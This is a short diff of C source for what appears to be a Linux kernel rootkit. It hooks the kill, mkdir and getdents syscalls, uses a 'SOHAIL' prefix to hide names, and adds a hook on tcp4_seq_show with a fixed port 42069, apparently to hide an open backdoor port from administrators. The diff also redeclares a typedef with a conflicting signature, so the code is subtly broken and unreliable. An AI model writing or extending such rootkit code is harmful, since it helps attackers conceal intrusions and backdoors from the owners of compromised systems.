@@ -4,6 +4,7 @@
 #include <linux/dirent.h>	        //contains dirent structs etc
 
 #define PREFIX "SOHAIL"
+#define PORT 42069
 
 #ifdef CONFIG_X86_64
 /* on 64-bit x86 and kernel v4.17 syscalls are nolonger
@@ -12,7 +13,7 @@
 
 #define PTREGS_SYSCALL_STUB 1
 /* kill */
-typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
+typedef asmlinkage long (*ptregs_t)(const struct pt_regs *);
 static ptregs_t orig_kill;
 /* mkdir */
 typedef asmlinkage long (*ptregs_t)(const struct pt_regs *);
@@ -23,6 +24,9 @@ static ptregs_t orig_getdents64;
 /* ls 32-bit */
 typedef asmlinkage long (*ptregs_t)(const struct pt_regs *);
 static ptregs_t orig_getdents;
+/* open ports */
+typedef asmlinkage long (*ptregs_t)(const struct seq_file *seq, void *v);
+static ptregs_t orig_tcp4_seq_show;
 
 
 #else
